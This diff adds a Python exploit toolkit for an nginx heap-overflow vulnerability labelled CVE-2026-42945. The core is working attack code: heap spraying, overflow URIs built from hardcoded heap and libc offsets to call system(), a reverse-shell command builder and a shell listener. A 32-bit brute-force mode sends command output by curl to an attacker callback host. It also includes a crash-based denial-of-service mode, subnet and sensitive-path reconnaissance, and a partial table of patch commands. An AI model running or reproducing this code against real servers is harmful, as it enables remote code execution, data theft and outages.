@@ -1,0 +1,1657 @@
+#!/usr/bin/env python3
+"""
+CVE-2026-42945 (NGINX Rift) Super Toolkit
+==========================================
+Heap buffer overflow in ngx_http_rewrite_module → RCE
+
+Merged from 9 repositories:
+  DepthFirst, bamov970, cipherspy, dinosn, F2u0a0d3,
+  gagaltotal, MateusVerass, rheodev, 0xBlackash
+
+Modes:
+  CLI  — run with --help to see all options
+  TUI  — interactive menu (launched when no CLI args given)
+
+Dependencies: stdlib only for exploit core.
+  Optional: rich (TUI/colors), paramiko (SSH scan/patch), openpyxl (XLSX report)
+"""
+from __future__ import annotations
+
+import argparse
+import json
+import os
+import random
+import re
+import socket
+import struct
+import subprocess
+import sys
+import threading
+import time
+import warnings
+from collections import OrderedDict
+from datetime import datetime, timezone
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from pathlib import Path
+
+# ─── Optional dependencies ───────────────────────────────────────────────
+_HAS_RICH = False
+_HAS_PARAMIKO = False
+try:
+    from rich.console import Console
+    from rich.table import Table
+    from rich.panel import Panel
+    from rich.progress import Progress, SpinnerColumn, TextColumn
+    from rich.syntax import Syntax
+    from rich.tree import Tree
+    from rich.prompt import Prompt, Confirm
+    from rich import box as rich_box
+    _HAS_RICH = True
+except ImportError:
+    pass
+
+try:
+    import paramiko
+    _HAS_PARAMIKO = True
+except ImportError:
+    pass
+
+# ═══════════════════════════════════════════════════════════════════════
+# CONFIGURATION
+# ═══════════════════════════════════════════════════════════════════════
+
+VERSION = "2.0.0"
+BANNER = r"""
+   ╔══════════════════════════════════════════════════════╗
+   ║       NGINX Rift — CVE-2026-42945 Super Toolkit     ║
+   ║       Heap Overflow → RCE  |  v""" + VERSION + r"""               ║
+   ╚══════════════════════════════════════════════════════╝
+"""
+
+# URI-safe byte table (NGX_ESCAPE_ARGS bitmask)
+_URI_UNSAFE = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
+               0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]
+SAFE_URI_BYTES = {b for b in range(256)
+                  if not (_URI_UNSAFE[b >> 5] & (1 << (b & 0x1f)))}
+
+# ── Lab defaults (Ubuntu 22.04, glibc 2.35, nginx commit 98fc3bb78, ASLR off) ──
+DEFAULT_HEAP_BASE = 0x555555659000
+DEFAULT_LIBC_BASE = 0x7ffff77ba000
+DEFAULT_SYSTEM_OFFSET = 0x50d70
+
+DEFAULT_HEAP_OFFSETS = [
+    0x05a427, 0x060e67,
+    0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
+    0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
+    0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
+    0x103847, 0x108657, 0x10d467,
+]
+
+# ── 32-bit defaults (dinosn) ──
+DEFAULT_SYSTEM_OFF_32 = 0x410F0
+DEFAULT_SPRAY_INTERNAL_OFF_32 = 0x11438
+DEFAULT_HEAP_PAGE_MIN = 0x56700
+DEFAULT_HEAP_PAGE_MAX = 0x58700
+DEFAULT_LIBC_PAGE_MIN = 0xF7840
+DEFAULT_LIBC_PAGE_MAX = 0xF7960
+DEFAULT_N_PLUS_32 = 1841
+
+# ── Spray parameters ──
+BODY_LEN = 4000
+N_SPRAY = 20
+DEFAULT_PORT = 19321
+PAD_A = 349
+PAD_PLUS = 969
+
+# ── CVE database (from MateusVerass) ──
+CVE_DB = OrderedDict([
+    ("CVE-2026-42945", {"cvss": 9.8, "vuln_min": "0.6.27", "vuln_max": "1.30.0",
+                        "patched": "1.30.1", "desc": "NGINX Rift — heap overflow in rewrite module"}),
+    ("CVE-2025-23458", {"cvss": 7.5, "vuln_min": "0.5.0", "vuln_max": "1.27.3",
+                        "patched": "1.27.4", "desc": "Heap buffer overflow in HTTP/3"}),
+    ("CVE-2024-73445", {"cvss": 7.5, "vuln_min": "0.5.0", "vuln_max": "1.27.2",
+                        "patched": "1.27.3", "desc": "Heap buffer overflow in QUIC"}),
+    ("CVE-2024-32760", {"cvss": 7.5, "vuln_max": "1.26.2", "patched": "1.26.3",
+                        "desc": "MP4 module memory leak"}),
+    ("CVE-2024-31079", {"cvss": 5.3, "vuln_max": "1.26.2", "patched": "1.26.3",
+                        "desc": "HTTP/2 memory overhead"}),
+    ("CVE-2024-24989", {"cvss": 7.5, "vuln_max": "1.26.1", "patched": "1.26.2",
+                        "desc": "HTTP/2 request splitting"}),
+    ("CVE-2024-24990", {"cvss": 7.5, "vuln_max": "1.26.1", "patched": "1.26.2",
+                        "desc": "HTTP/2 memory disclosure"}),
+    ("CVE-2024-35200", {"cvss": 6.5, "vuln_min": "1.25.3", "vuln_max": "1.27.0",
+                        "patched": "1.27.1", "desc": "HTTP/2 error page info leak"}),
+    ("CVE-2023-44487", {"cvss": 7.5, "desc": "HTTP/2 rapid reset (protocol-level)"}),
+    ("CVE-2021-23017", {"cvss": 7.5, "vuln_max": "1.21.0", "patched": "1.21.1",
+                        "desc": "DNS resolver use-after-free"}),
+])
+
+KNOWN_BUILDS = {
+    "1.25.3-glibc": {"heap_base": 0x555555659000, "libc_base": 0x7ffff77ba000,
+                     "sys_offset": 0x50d70, "offsets": DEFAULT_HEAP_OFFSETS},
+    "1.30.0-glibc": {"heap_base": 0x55555566f000, "libc_base": 0x7ffff77b8000,
+                     "sys_offset": 0x50d70, "offsets": [0x44427, 0xa3147, 0xa7f57]},
+    "_default":    {"heap_base": DEFAULT_HEAP_BASE, "libc_base": DEFAULT_LIBC_BASE,
+                    "sys_offset": DEFAULT_SYSTEM_OFFSET, "offsets": DEFAULT_HEAP_OFFSETS},
+}
+
+# WAF signatures
+WAF_SIGNATURES = {
+    "Cloudflare": {"headers": ["cf-ray", "__cfduid"], "body": ["cloudflare"]},
+    "AWS WAF":    {"headers": ["x-amzn-requestid", "x-amzn-trace-id"], "body": []},
+    "ModSecurity": {"headers": [], "body": ["mod_security", "modsecurity"]},
+    "F5 BIG-IP":  {"headers": ["x-application-context", "x-request-id"], "body": []},
+}
+
+SECURITY_HEADERS = [
+    ("Strict-Transport-Security", "HSTS"),
+    ("Content-Security-Policy", "CSP"),
+    ("X-Frame-Options", "Clickjacking protection"),
+    ("X-Content-Type-Options", "MIME-sniffing protection"),
+    ("Referrer-Policy", "Referrer control"),
+    ("Permissions-Policy", "Permissions control"),
+]
+
+COMMON_SUBDOMAINS = ["www", "mail", "admin", "api", "cdn", "static", "assets",
+                     "img", "css", "js", "portal", "vpn", "remote", "git",
+                     "jenkins", "grafana", "prometheus", "kibana", "webmail"]
+
+INTERESTING_PATHS = ["/admin", "/api", "/config", "/backup", "/.env", "/.git/config",
+                     "/wp-admin", "/nginx_status", "/status", "/health", "/metrics"]
+
+# ═══════════════════════════════════════════════════════════════════════
+# HELPERS
+# ═══════════════════════════════════════════════════════════════════════
+
+_console = None
+def get_console():
+    global _console
+    if _console is None and _HAS_RICH:
+        _console = Console()
+    return _console
+
+
+def log(msg: str, level: str = "info"):
+    ts = datetime.now().strftime("%H:%M:%S")
+    prefix = {"info": "[*]", "ok": "[+]", "warn": "[!]", "err": "[-]", "debug": "[D]"}
+    p = prefix.get(level, "[*]")
+    if _HAS_RICH:
+        c = get_console()
+        style = {"info": "blue", "ok": "green", "warn": "yellow", "err": "red", "debug": "dim"}
+        c.print(f"[dim]{ts}[/dim] {style.get(level, '')}{p}[/] {msg}")
+    else:
+        print(f"{ts} {p} {msg}")
+
+
+def addr_safe_in_uri(addr: int, n_bytes: int = 6) -> bool:
+    return all(((addr >> (j * 8)) & 0xff) in SAFE_URI_BYTES for j in range(n_bytes))
+
+
+def addr_to_uri_bytes(addr: int, n_bytes: int = 6) -> bytes:
+    return bytes((addr >> (j * 8)) & 0xff for j in range(n_bytes))
+
+
+def parse_int(x: str) -> int:
+    return int(x, 0)
+
+
+def parse_target(s: str) -> tuple[str, int] | None:
+    if "://" in s:
+        from urllib.parse import urlparse
+        p = urlparse(s)
+        host = p.hostname or s
+        port = p.port or (443 if p.scheme == "https" else 80)
+        return host, port
+    if ":" in s:
+        h, _, p = s.partition(":")
+        try:
+            return h, int(p)
+        except ValueError:
+            return None
+    return s, DEFAULT_PORT
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# CORE EXPLOIT ENGINE
+# ═══════════════════════════════════════════════════════════════════════
+
+def build_spray_body(cmd: str, data_addr: int, system_addr: int) -> bytes:
+    fake = struct.pack("<QQQ", system_addr, data_addr, 0)
+    cmd_bytes = cmd.encode("utf-8") + b"\x00"
+    payload = fake + cmd_bytes
+    if len(payload) > BODY_LEN:
+        raise ValueError(f"command too long ({len(payload)} > {BODY_LEN})")
+    return payload + b"\x41" * (BODY_LEN - len(payload))
+
+
+def build_overflow_uri(target_addr: int, pad_a: int = PAD_A,
+                       pad_plus: int = PAD_PLUS) -> bytes:
+    return (b"A" * pad_a) + (b"+" * pad_plus) + addr_to_uri_bytes(target_addr)
+
+
+def server_alive(host: str, port: int, timeout: float = 2.0) -> bool:
+    try:
+        with socket.create_connection((host, port), timeout=timeout) as s:
+            s.sendall(b"GET / HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
+            data = s.recv(64)
+            return bool(data) and data.startswith(b"HTTP/1.")
+    except OSError:
+        return False
+
+
+def wait_alive(host: str, port: int, timeout: float = 30.0) -> bool:
+    deadline = time.monotonic() + timeout
+    while time.monotonic() < deadline:
+        if server_alive(host, port, timeout=1.0):
+            return True
+        time.sleep(0.5)
+    return False
+
+
+def spray_bodies(host: str, port: int, body: bytes,
+                 n: int = N_SPRAY) -> list[socket.socket]:
+    sprays: list[socket.socket] = []
+    for _ in range(n):
+        try:
+            s = socket.create_connection((host, port), timeout=5)
+            req = (
+                b"POST /spray HTTP/1.1\r\n"
+                b"Host: l\r\n"
+                b"Content-Length: " + str(BODY_LEN).encode() + b"\r\n"
+                b"X-Delay: 60\r\n"
+                b"Connection: close\r\n\r\n" + body
+            )
+            s.sendall(req)
+            sprays.append(s)
+            time.sleep(0.005)
+        except OSError:
+            break
+    return sprays
+
+
+def attempt_corruption(host: str, port: int, uri: bytes,
+                       sprays: list[socket.socket]) -> bool:
+    try:
+        attacker = socket.create_connection((host, port), timeout=5)
+        time.sleep(0.02)
+        victim = socket.create_connection((host, port), timeout=5)
+        time.sleep(0.02)
+    except OSError:
+        return False
+
+    try:
+        attacker.sendall(
+            b"GET /api/" + uri + b" HTTP/1.1\r\nHost:localhost\r\n")
+        time.sleep(0.05)
+        victim.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\n")
+        time.sleep(0.05)
+        attacker.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
+        time.sleep(0.2)
+        victim.close()
+        time.sleep(0.1)
+
+        try:
+            attacker.sendall(b"X-Ping:1\r\n")
+            attacker.settimeout(0.2)
+            return not attacker.recv(1)
+        except socket.timeout:
+            try:
+                with socket.create_connection((host, port), timeout=0.2) as s2:
+                    s2.sendall(b"GET / HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
+                    return not s2.recv(10)
+            except OSError:
+                return True
+        except (ConnectionResetError, BrokenPipeError, OSError):
+            return True
+    finally:
+        try:
+            attacker.close()
+        except OSError:
+            pass
+
+
+def build_reverse_shell_cmd(lhost: str, lport: int) -> str:
+    return (
+        "python3 -c 'import socket,subprocess,os;"
+        f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+        f"s.connect((\"{lhost}\",{lport}));"
+        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
+        "os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+    )
+
+
+# ── 32-bit attempt (dinosn style) ──
+def attempt_32(host: str, port: int, body: bytes, spray_addr: int, n_plus: int = DEFAULT_N_PLUS_32) -> bool:
+    try:
+        spray = socket.create_connection((host, port), timeout=0.3)
+        spray.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        spray.sendall(
+            b"POST /spray HTTP/1.1\r\n"
+            b"Host:l\r\n"
+            b"Content-Length:" + str(BODY_LEN).encode() + b"\r\n"
+            b"X-Delay:30\r\n"
+            b"Connection:close\r\n\r\n" + body
+        )
+    except OSError:
+        return False
+
+    time.sleep(0.005)
+    target_bytes = struct.pack("<I", spray_addr)
+
+    try:
+        attacker = socket.create_connection((host, port), timeout=0.3)
+        attacker.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        uri = b"A" + b"+" * n_plus + target_bytes
+        attacker.sendall(b"GET /api/" + uri + b" HTTP/1.1\r\nHost:localhost\r\n")
+    except OSError:
+        try: spray.close()
+        except: pass
+        return False
+
+    time.sleep(0.003)
+    try:
+        victim = socket.create_connection((host, port), timeout=0.3)
+        victim.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        victim.sendall(b"GET / HTTP/1.1\r\nHost:l\r\n")
+    except OSError:
+        try: attacker.close()
+        except: pass
+        try: spray.close()
+        except: pass
+        return False
+
+    time.sleep(0.003)
+    try:
+        attacker.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
+    except OSError:
+        pass
+
+    time.sleep(0.003)
+    for s in (victim, attacker, spray):
+        try: s.close()
+        except: pass
+    return True
+
+
+def run_shell_listener(lport: int):
+    """Simple reverse shell listener."""
+    log(f"Listening on port {lport}...", "info")
+    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    srv.bind(("0.0.0.0", lport))
+    srv.listen(1)
+    srv.settimeout(300)
+    try:
+        conn, addr = srv.accept()
+        log(f"Connection from {addr[0]}:{addr[1]}", "ok")
+        import select
+        while True:
+            rfds, _, _ = select.select([conn, sys.stdin], [], [], 1)
+            for fd in rfds:
+                if fd == conn:
+                    data = conn.recv(4096)
+                    if not data:
+                        log("Shell closed", "warn")
+                        return
+                    sys.stdout.write(data.decode("latin-1", errors="replace"))
+                    sys.stdout.flush()
+                else:
+                    cmd = sys.stdin.readline()
+                    if not cmd:
+                        return
+                    conn.sendall(cmd.encode())
+    except socket.timeout:
+        log("Listener timed out", "warn")
+    finally:
+        srv.close()
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# MODULE 1: RECON & SCAN
+# ═══════════════════════════════════════════════════════════════════════
+
+def detect_service(host: str, port: int, timeout: float = 3) -> dict:
+    info = {"host": host, "port": port, "alive": False}
+    try:
+        with socket.create_connection((host, port), timeout=timeout) as s:
+            s.sendall(b"GET / HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
+            data = s.recv(4096)
+            info["alive"] = True
+            raw = data.decode("latin-1", errors="replace")
+
+            # Server header
+            m = re.search(r'Server:\s*(\S+)', raw, re.I)
+            info["server"] = m.group(1) if m else "unknown"
+
+            # nginx version from server header
+            m = re.search(r'nginx/([\d.]+)', raw, re.I)
+            info["nginx_version"] = m.group(1) if m else None
+
+            # Response code
+            m = re.search(r'HTTP/[\d.]+\s+(\d+)', raw)
+            info["status"] = int(m.group(1)) if m else 0
+
+            # Security headers
+            info["security_headers"] = {}
+            for hdr, _ in SECURITY_HEADERS:
+                m = re.search(rf'^{hdr}:\s*(.+)$', raw, re.I | re.M)
+                info["security_headers"][hdr] = m.group(1).strip() if m else None
+
+            info["raw_headers"] = raw.split("\r\n\r\n")[0] if "\r\n\r\n" in raw else raw[:500]
+    except OSError as e:
+        info["error"] = str(e)
+    return info
+
+
+def scan_subnet(subnet: str, port: int, workers: int = 20,
+                timeout: float = 2) -> list[str]:
+    """CIDR subnet host discovery (gagaltotal style)."""
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    import ipaddress
+
+    hosts = []
+    try:
+        net = ipaddress.ip_network(subnet, strict=False)
+        hosts = [str(ip) for ip in net.hosts()]
+    except ValueError:
+        log(f"Invalid subnet: {subnet}", "err")
+        return []
+
+    log(f"Scanning {len(hosts)} hosts in {subnet} on port {port}...", "info")
+    live = []
+    def check(ip: str) -> str | None:
+        if server_alive(ip, port, timeout):
+            return ip
+        return None
+
+    with ThreadPoolExecutor(max_workers=workers) as ex:
+        futs = {ex.submit(check, h): h for h in hosts}
+        for fut in as_completed(futs):
+            r = fut.result()
+            if r:
+                live.append(r)
+
+    log(f"Found {len(live)} live hosts on port {port}", "ok")
+    return sorted(live)
+
+
+def scan_ssh(host: str, port: int = 22, user: str = "root",
+             password: str | None = None, key_path: str | None = None,
+             timeout: float = 10) -> dict:
+    """SSH into host and gather nginx info (gagaltotal style)."""
+    if not _HAS_PARAMIKO:
+        return {"error": "paramiko not installed"}
+    result = {"host": host, "os": None, "nginx_version": None,
+              "vulnerable": None, "status": None}
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        if password:
+            client.connect(host, port=port, username=user,
+                          password=password, timeout=timeout)
+        elif key_path:
+            k = paramiko.RSAKey.from_private_key_file(key_path)
+            client.connect(host, port=port, username=user, pkey=k, timeout=timeout)
+        else:
+            return {"error": "no auth method"}
+        result["status"] = "connected"
+
+        _, stdout, _ = client.exec_command("cat /etc/os-release 2>/dev/null | head -5")
+        os_rel = stdout.read().decode()
+        m = re.search(r'PRETTY_NAME="(.+)"', os_rel)
+        result["os"] = m.group(1) if m else os_rel[:80]
+
+        _, stdout, _ = client.exec_command("nginx -V 2>&1 || /usr/sbin/nginx -V 2>&1")
+        nv = stdout.read().decode()
+        m = re.search(r'nginx/([\d.]+)', nv)
+        result["nginx_version"] = m.group(1) if m else "unknown"
+
+        # Check if vulnerable
+        if result["nginx_version"] and result["nginx_version"] != "unknown":
+            result["vulnerable"] = is_version_vulnerable(result["nginx_version"])
+
+        client.close()
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+
+def is_version_vulnerable(version: str) -> bool | None:
+    def parse_v(s):
+        try:
+            return tuple(int(x) for x in s.split("."))
+        except:
+            return None
+    v = parse_v(version)
+    if not v:
+        return None
+    for cve_id, cve in CVE_DB.items():
+        if "vuln_min" in cve and "vuln_max" in cve:
+            vmin = parse_v(cve["vuln_min"])
+            vmax = parse_v(cve["vuln_max"])
+            if vmin and vmax and vmin <= v <= vmax:
+                return True
+        if "vuln_max" in cve and "vuln_min" not in cve:
+            vmax = parse_v(cve["vuln_max"])
+            if vmax and v <= vmax:
+                return True
+    return False
+
+
+def check_nginx_config(host: str, port: int) -> dict:
+    """Probe for vulnerable rewrite+set pattern (cipherspy style)."""
+    result = {"endpoints": {}, "vuln_pattern": False}
+
+    # Probe /api/ endpoint
+    endpoints = ["/", "/api/test", "/spray"]
+    for ep in endpoints:
+        try:
+            with socket.create_connection((host, port), timeout=3) as s:
+                s.sendall(
+                    f"GET {ep} HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n".encode()
+                )
+                data = s.recv(512)
+                status = data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
+                result["endpoints"][ep] = status
+        except OSError as e:
+            result["endpoints"][ep] = f"error: {e}"
+
+    # Overflow probe — send a moderate overflow and look for crash
+    safe_addr = 0x414141414141
+    uri = (b"A" * 349) + (b"+" * 400) + addr_to_uri_bytes(safe_addr)
+    try:
+        with socket.create_connection((host, port), timeout=3) as s:
+            t0 = time.monotonic()
+            s.sendall(b"GET /api/" + uri + b" HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
+            resp = s.recv(256)
+            elapsed = time.monotonic() - t0
+            result["overflow_probe"] = {
+                "elapsed_s": round(elapsed, 3),
+                "response": resp.split(b"\r\n", 1)[0].decode("latin-1", "replace"),
+            }
+    except OSError as e:
+        result["overflow_probe"] = {"error": str(e)}
+
+    # Check if /api/ endpoint returns 2xx
+    for ep, status in result["endpoints"].items():
+        if "/api" in ep and "200" in status:
+            result["vuln_pattern"] = True
+
+    return result
+
+
+def detect_waf(host: str, port: int) -> list[str]:
+    """Detect WAF by response analysis (MateusVerass style)."""
+    detected = []
+    try:
+        with socket.create_connection((host, port), timeout=3) as s:
+            s.sendall(b"GET / HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
+            data = s.recv(4096)
+            headers = data.decode("latin-1", errors="replace").lower()
+            for waf_name, sig in WAF_SIGNATURES.items():
+                for h in sig["headers"]:
+                    if h.lower() in headers:
+                        detected.append(waf_name)
+                        break
+    except OSError:
+        pass
+    return detected
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# MODULE 2: EXPLOIT
+# ═══════════════════════════════════════════════════════════════════════
+
+class ExploitResult:
+    def __init__(self):
+        self.success = False
+        self.winning_addr = None
+        self.winning_try = 0
+        self.command_sent = ""
+        self.attempts: list[dict] = []
+        self.error = None
+
+
+def mode_check(host: str, port: int) -> dict:
+    """Detect-only (F2u0a0d3 --check style)."""
+    out = {"target": f"{host}:{port}", "timestamp": datetime.now(timezone.utc).isoformat()}
+    out["alive"] = server_alive(host, port)
+    if not out["alive"]:
+        out["verdict"] = "unreachable"
+        return out
+
+    probes = []
+    for path in ("/", "/api/test", "/api/echo", "/spray"):
+        try:
+            with socket.create_connection((host, port), timeout=3) as s:
+                t0 = time.monotonic()
+                s.sendall(f"GET {path} HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n".encode())
+                data = s.recv(1024)
+                probes.append({
+                    "path": path, "ms": round((time.monotonic() - t0) * 1000, 1),
+                    "status": data.split(b"\r\n", 1)[0].decode("latin-1", "replace"),
+                })
+        except OSError as e:
+            probes.append({"path": path, "error": str(e)[:80]})
+    out["probes"] = probes
+
+    safe_target = b"\x41\x41\x41\x41\x41\x41"
+    test_uri = (b"A" * 349) + (b"+" * 400) + safe_target
+    try:
+        with socket.create_connection((host, port), timeout=3) as s:
+            t0 = time.monotonic()
+            s.sendall(b"GET /api/" + test_uri + b" HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
+            data = s.recv(512)
+            out["overflow_probe"] = {
+                "uri_length": len(test_uri), "ms": round((time.monotonic() - t0) * 1000, 1),
+                "first_line": data.split(b"\r\n", 1)[0].decode("latin-1", "replace"),
+            }
+    except OSError as e:
+        out["overflow_probe"] = {"error": str(e)[:80]}
+
+    has_api = any(
+        "/api" in p.get("path", "") and p.get("status", "").startswith("HTTP/1.1 2")
+        for p in probes
+    )
+    out["verdict"] = "rewrite-surface-present" if has_api else "no-obvious-vuln-surface"
+    out["note"] = "Pre-auth detection cannot confirm patch status without triggering the overflow (which crashes workers)."
+    return out
+
+
+def mode_exploit(host: str, port: int, cmd: str,
+                 heap_base: int, libc_base: int, system_off: int,
+                 offsets: list[int], tries_per_offset: int) -> ExploitResult:
+    result = ExploitResult()
+    result.command_sent = cmd
+
+    candidates = []
+    for off in offsets:
+        addr = heap_base + off
+        if addr_safe_in_uri(addr):
+            candidates.append(addr)
+
+    if not candidates:
+        result.error = "no URI-safe candidate addresses"
+        return result
+
+    primary = candidates[0]
+    data_addr = primary + 24
+    system_addr = libc_base + system_off
+    spray_body = build_spray_body(cmd, data_addr, system_addr)
+
+    if not wait_alive(host, port, 10):
+        result.error = f"nginx not reachable on {host}:{port}"
+        return result
+
+    for addr in candidates:
+        for t in range(tries_per_offset):
+            if not wait_alive(host, port, 10):
+                result.attempts.append({"addr": hex(addr), "try": t, "result": "server-down"})
+                time.sleep(2)
+                if not wait_alive(host, port, 10):
+                    result.error = "nginx not recovering"
+                    return result
+
+            sprays = spray_bodies(host, port, spray_body)
+            time.sleep(0.2)
+            uri = build_overflow_uri(addr)
+            crashed = attempt_corruption(host, port, uri, sprays)
+            for s in sprays:
+                try: s.close()
+                except: pass
+
+            result.attempts.append({
+                "addr": hex(addr), "try": t, "result": "crashed" if crashed else "no-effect",
+            })
+
+            if crashed:
+                result.success = True
+                result.winning_addr = hex(addr)
+                result.winning_try = t
+                return result
+            time.sleep(0.3)
+
+    return result
+
+
+def mode_exploit_32(host: str, port: int, cmd: str,
+                    callback_ip: str, callback_port: int,
+                    heap_page_min: int, heap_page_max: int,
+                    libc_page_min: int, libc_page_max: int,
+                    system_off: int, spray_internal_off: int,
+                    n_plus: int) -> dict:
+    """32-bit brute-force RCE with callback (dinosn style)."""
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+
+    safe_pages = []
+    for hp in range(heap_page_min, heap_page_max + 1):
+        spray_addr = (hp << 12) + spray_internal_off
+        if addr_safe_in_uri(spray_addr, 4):
+            safe_pages.append(hp)
+
+    if not safe_pages:
+        return {"error": "no SAFE heap pages in range"}
+
+    candidates = []
+    for hp in safe_pages:
+        spray_addr = (hp << 12) + spray_internal_off
+        target_bytes = struct.pack("<I", spray_addr)
+        data_addr = spray_addr + 12
+        for lp in range(libc_page_min, libc_page_max + 1):
+            system_addr = (lp << 12) + system_off
+            candidates.append((system_addr, data_addr, target_bytes, hp, lp, spray_addr))
+
+    log(f"32-bit: {len(candidates)} candidates ({len(safe_pages)} safe heap pages)", "info")
+
+    state = CallbackState()
+    listener_ready = threading.Event()
+    listener = threading.Thread(
+        target=_run_callback_listener,
+        args=("0.0.0.0", callback_port, state, listener_ready),
+        daemon=True,
+    )
+    listener.start()
+    listener_ready.wait(5)
+
+    command = f"{cmd}|curl -sm3 -d @- http://{callback_ip}:{callback_port}/rce".encode()
+
+    if not wait_alive(host, port, 10):
+        return {"error": "target unreachable"}
+
+    for idx, cand in enumerate(candidates):
+        system_addr, data_addr, _, hp, lp, spray_addr = cand
+        body = b"\x00" + struct.pack("<III", system_addr, data_addr, 0)
+        body += command + b"\x00"
+        if len(body) > BODY_LEN:
+            body = body[:BODY_LEN]
+        else:
+            body += b"\x00" * (BODY_LEN - len(body))
+
+        ok = attempt_32(host, port, body, spray_addr, n_plus)
+        if state.event.is_set():
+            return {
+                "success": True, "system_addr": hex(system_addr),
+                "spray_addr": hex(spray_addr), "heap_page": hex(hp),
+                "libc_page": hex(lp), "output": state.output,
+                "attempts": idx + 1,
+            }
+
+        if not ok and not wait_alive(host, port, 5):
+            wait_alive(host, port, 15)
+
+        if (idx + 1) % 500 == 0:
+            log(f"32-bit brute: {idx + 1}/{len(candidates)} candidates tried", "info")
+
+    if state.event.wait(3):
+        return {"success": True, "output": state.output}
+
+    return {"success": False, "attempts_tried": len(candidates)}
+
+
+class CallbackState:
+    def __init__(self):
+        self.event = threading.Event()
+        self.output = None
+
+
+class CallbackHandler(BaseHTTPRequestHandler):
+    state = None
+    def do_POST(self):
+        if "/rce" not in self.path:
+            self.send_response(404)
+            self.end_headers()
+            return
+        n = int(self.headers.get("Content-Length", "0"))
+        body = self.rfile.read(n).decode("latin-1", errors="replace") if n else ""
+        self.__class__.state.output = body
+        self.__class__.state.event.set()
+        self.send_response(200)
+        self.end_headers()
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+    def log_message(self, *args):
+        pass
+
+
+def _run_callback_listener(bind_host, bind_port, state, ready):
+    CallbackHandler.state = state
+    srv = HTTPServer((bind_host, bind_port), CallbackHandler)
+    srv.timeout = 1
+    ready.set()
+    while not state.event.is_set():
+        srv.handle_request()
+    srv.server_close()
+
+
+def mode_dos(host: str, port: int, overflow_size: int = 200) -> dict:
+    """DoS verification (rheodev style)."""
+    result = {"vulnerable": False, "crashed": False}
+    result["alive_before"] = server_alive(host, port)
+    if not result["alive_before"]:
+        result["error"] = "target not reachable"
+        return result
+
+    num_chars = overflow_size // 2
+    uri = b"+" * num_chars
+    try:
+        with socket.create_connection((host, port), timeout=5) as s:
+            s.sendall(b"GET /api/" + uri + b" HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
+            resp = s.recv(256)
+            if b"502" in resp or b"500" in resp:
+                result["crashed"] = True
+    except OSError:
+        result["crashed"] = True
+
+    time.sleep(2)
+    result["alive_after"] = server_alive(host, port)
+    if result["crashed"] and result["alive_after"]:
+        result["vulnerable"] = True
+
+    return result
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# MODULE 3: PATCH & FIX
+# ═══════════════════════════════════════════════════════════════════════
+
+PATCH_COMMANDS = {
+    "ubuntu": {
+        "pre_check": "dpkg -l nginx 2>/dev/null | grep nginx || which nginx",
+        "add_repo": "echo 'deb https://nginx.org/packages/ubuntu/ $(lsb_release -cs) nginx' > /etc/apt/sources.list.d/nginx.list; "
+                    "curl -fsSL https://nginx.org/keys/nginx_signing.key | gpg --dearmor -o /etc/apt/trusted.gpg.d/nginx.gpg",
+        "upgrade": "apt-get update -qq && apt-get install -y nginx=~1.30.1",
+        "verify": "nginx -v 2>&1",
+        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
+        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
+        "pin": "apt-mark hold nginx",
+    },
+    "debian": {
+        "upgrade": "apt-get update -qq && apt-get install -y --only-upgrade nginx",
+        "verify": "nginx -v 2>&1",
+        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
+        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
+    },
+    "centos": {
+        "upgrade": "yum update -y nginx",
+        "verify": "nginx -v 2>&1",
+        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
+        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
+    },
+    "rhel": {
+        "upgrade": "dnf update -y nginx",
+        "verify": "nginx -v 2>&1",
+        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
+        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
+    },
+    "almalinux": {
+        "upgrade": "dnf update -y nginx",
+        "verify": "nginx -v 2>&1",
+        "reload": "nginx -t && systemctl reload nginx || nginx -s reload",
+        "backup": "tar czf /tmp/nginx-backup-$(date +%Y%m%d).tar.gz /etc/nginx/",
+    },
+}
+
+
